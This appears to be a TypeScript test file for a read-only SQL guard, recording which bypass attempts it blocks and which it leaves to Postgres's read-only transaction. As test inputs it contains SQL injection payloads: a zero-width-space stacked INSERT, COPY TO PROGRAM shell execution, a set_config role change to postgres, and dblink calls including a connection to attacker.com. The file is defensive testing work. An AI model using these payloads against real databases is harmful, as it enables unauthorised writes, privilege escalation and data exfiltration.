import { describe, expect, test } from "bun:test";
import { checkReadOnlySql } from "../guard";

/**
 * Attacker bypass attempts against the four-layer read-only SQL guard.
 *
 * The guard is explicitly documented as best-effort (Layer 1); the real safety
 * net is `SET TRANSACTION READ ONLY` at the Postgres level (Layer 2).
 *
 * These tests document what the guard catches and what it doesn't, so that
 * future maintainers understand the defence-in-depth model.
 */
describe("checkReadOnlySql - bypass resistance", () => {
	describe("blocked: multi-statement with Unicode zero-width chars", () => {
		test("rejects INSERT with zero-width space after semicolon", () => {
			const sql = "SELECT 1;\u200BINSERT INTO t VALUES (1)";
			const result = checkReadOnlySql(sql);
			expect(result.ok).toBe(false);
			if (!result.ok) expect(result.reason).toBe("multi_statement");
		});
	});

	describe("blocked: COPY to program", () => {
		test("rejects COPY (forbidden first keyword)", () => {
			const sql = "COPY users TO PROGRAM 'cat > /tmp/out'";
			const result = checkReadOnlySql(sql);
			expect(result.ok).toBe(false);
		});
	});

	describe("guard pass-through (defended by SET TRANSACTION READ ONLY)", () => {
		// SELECT INTO creates a table. The guard doesn't catch it because the
		// first keyword is SELECT and INTO is not forbidden. However, Postgres
		// will reject it inside a READ ONLY transaction.
		test("SELECT INTO passes guard (blocked by PG read-only transaction)", () => {
			const result = checkReadOnlySql("SELECT * INTO new_table FROM users");
			expect(result.ok).toBe(true);
		});

		test("SELECT INTO TEMP passes guard (blocked by PG read-only transaction)", () => {
			const result = checkReadOnlySql(
				"SELECT * INTO TEMP TABLE tmp FROM users",
			);
			expect(result.ok).toBe(true);
		});

		// `SELECT * INTO t` is still a pass-through: the first keyword is SELECT
		// and INTO is not a forbidden word, so only the PG layer stops it.
	});

	describe("blocked: session-mutating functions", () => {
		// Now caught by the function-family pattern. Changing role mid-session is
		// never legitimate for an analytics SELECT, so reject rather than rely on
		// the transaction layer.
		test("set_config is rejected", () => {
			const result = checkReadOnlySql(
				"SELECT set_config('role', 'postgres', false)",
			);
			expect(result.ok).toBe(false);
			if (!result.ok) expect(result.reason).toBe("not_read_only");
		});
	});

	describe("blocked: dblink variants", () => {
		test("dblink_exec is rejected", () => {
			const sql = "SELECT dblink_exec('conn', 'INSERT INTO t VALUES(1)')";
			const result = checkReadOnlySql(sql);
			expect(result.ok).toBe(false);
			if (!result.ok) expect(result.reason).toBe("not_read_only");
		});

		test("dblink_connect is rejected", () => {
			const sql =
				"SELECT dblink_connect('myconn', 'host=attacker.com dbname=x')";
			const result = checkReadOnlySql(sql);
			expect(result.ok).toBe(false);
			if (!result.ok) expect(result.reason).toBe("not_read_only");
		});

		test("plain dblink is rejected", () => {
			const sql =
				"SELECT * FROM dblink('host=x', 'DELETE FROM t') AS t(x text)";
			const result = checkReadOnlySql(sql);
			expect(result.ok).toBe(false);
			if (!result.ok) expect(result.reason).toBe("not_read_only");
		});
	});

	describe("double-quoted identifiers are opaque to the tokenizer", () => {
		// Fixed: the tokenizer now treats "..." like a string literal, so a
		// semicolon inside a quoted identifier is not a statement boundary.
		test("double-quoted identifier with semicolons is accepted", () => {
			const sql = 'SELECT "col;name" FROM t';
			expect(checkReadOnlySql(sql).ok).toBe(true);
		});
	});
});
